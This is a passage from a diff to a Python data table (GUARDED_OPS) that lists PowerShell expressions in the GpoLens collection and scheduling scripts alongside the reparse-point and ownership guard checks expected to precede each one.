+                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
+                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
+                "guard if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$child.FullName",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
+                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
+                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
+                "guard if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
+                "if ($child.PSIsContainer) after []",
+            ),
+        ),
+        (
+            "[Text.Encoding]::UTF8",
+            (
+                "function Assert-GpoLensCollectionOwner",
+                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
+            ),
+        ),
+        (
+            "[StringComparison]::OrdinalIgnoreCase",
+            (
+                "function Assert-GpoLensCollectionOwner",
+                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "(Get-Item -LiteralPath $OutputRoot -Force).Attributes",
+            (
+                "function Invoke-GpoLensCollection",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileAttributes]::ReparsePoint",
+            (
+                "function Invoke-GpoLensCollection",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileMode]::OpenOrCreate",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "[IO.FileAccess]::ReadWrite",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "[IO.FileShare]::None",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "(Resolve-Path -LiteralPath $InventoryPath).ProviderPath",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if ($InventoryPath) after []",
+            ),
+        ),
+        (
+            "[Text.Encoding]::UTF8",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if ($InventoryPath) after []",
+            ),
+        ),
+        (
+            "[guid]::Empty",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if ($InventoryPath) after []",
+                "guard if (-not $inventory) -> throw",
+                "foreach ($entry in @($inventory))",
+            ),
+        ),
+        (
+            "$entry.Id",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if ($InventoryPath) after []",
+                "guard if (-not $inventory) -> throw",
+                "foreach ($entry in @($inventory))",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[guid]::Empty",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if ($InventoryPath) after []",
+                "guard if (-not $inventory) -> throw",
+                "foreach ($entry in @($inventory))",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$_.FullName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            "$_.FullName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "$created.Count",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$created.Count",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if ($created.Count -ne 1) after []",
+            ),
+        ),
+        (
+            "$newest.BaseName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+            ),
+        ),
+        (
+            "$newest.FullName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "try",
+            ),
+        ),
+        (
+            "$inventoryBytes.Length",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "try",
+                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
+                "if ($InventoryPath) after []",
+                "try",
+            ),
+        ),
+        (
+            "$newest.FullName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "catch []",
+            ),
+        ),
+        (
+            "$newest.Name",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "if ($CopyTo) after []",
+            ),
+        ),
+        (
+            "$newest.FullName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "if ($CopyTo) after []",
+                "try",
+            ),
+        ),
+        (
+            "$newest.BaseName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "$newest.BaseName.Length",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "$newest.BaseName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "$_.BaseName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "$_.BaseName.Length",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "$_.BaseName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "[StringComparison]::Ordinal",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "$archive.BaseName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "foreach ($archive in $expired)",
+            ),
+        ),
+        (
+            "$archive.FullName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "foreach ($archive in $expired)",
+                "guard Assert-GpoLensRegularTree -Root $folder",
+            ),
+        ),
+        (
+            "$newest.Name",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "$newest.FullName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "$failure.Exception.Message",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "catch []",
+                "try",
+            ),
+        ),
+        (
+            "$failure.Exception",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "catch []",
+                "try",
+            ),
+        ),
+        (
+            "$MyInvocation.InvocationName",
+            ("if-condition after []",),
+        ),
+        (
+            "$_.Exception.Message",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "catch []",
+            ),
+        ),
+        (
+            "$_.Exception",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "catch []",
+            ),
+        ),
     ),
     "GpoLensCollectionMarker.ps1": (
         (
@@ -7800,6 +9816,182 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                     "[IO.FileAttributes]::ReparsePoint)) -> throw"
                 ),
                 "finally",
+            ),
+        ),
+        (
+            "(Get-Item -LiteralPath $Marker -Force -ErrorAction Stop).Attributes",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileAttributes]::ReparsePoint",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileMode]::Open",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[IO.FileAccess]::Read",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[IO.FileShare]::Read",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[Environment]::OSVersion.Platform",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[Environment]::OSVersion",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[PlatformID]::Win32NT",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$stream.SafeFileHandle",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "try",
+                "if ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT) after []",
+            ),
+        ),
+        (
+            "$stream.SafeFileHandle",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "try",
+                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
+            ),
+        ),
+        (
+            "$root.PSIsContainer",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$root.Attributes",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileAttributes]::ReparsePoint",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$root.FullName",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[IO.FileMode]::CreateNew",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[IO.FileAccess]::Write",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[IO.FileShare]::None",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "$Bytes.Length",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
             ),
         ),
     ),
@@ -8670,6 +10862,179 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 ),
             ),
         ),
+        (
+            "[timespan]::Zero",
+            ("scriptblock in AttributeAst",),
+        ),
+        (
+            "(Get-Item -LiteralPath $OutputRoot -Force).Attributes",
+            (
+                "function Set-GpoLensCollectionOwner",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileAttributes]::ReparsePoint",
+            (
+                "function Set-GpoLensCollectionOwner",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[IO.FileMode]::OpenOrCreate",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[IO.FileAccess]::ReadWrite",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[IO.FileShare]::None",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "[Text.Encoding]::UTF8",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "if (Test-Path -LiteralPath $marker) after []",
+            ),
+        ),
+        (
+            "[StringComparison]::OrdinalIgnoreCase",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "if (Test-Path -LiteralPath $marker) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$MyInvocation.InvocationName",
+            ("if-condition after []",),
+        ),
+        (
+            "[datetime]::MinValue",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+            ),
+        ),
+        (
+            "[Globalization.CultureInfo]::InvariantCulture",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "[Globalization.DateTimeStyles]::None",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "(Resolve-Path -LiteralPath $CollectorPath).ProviderPath",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            (
+                "(Resolve-Path -LiteralPath (Join-Path $PSScriptRoot "
+                "'Run-GpoLensCollection.ps1')).ProviderPath"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "$Credential.UserName",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
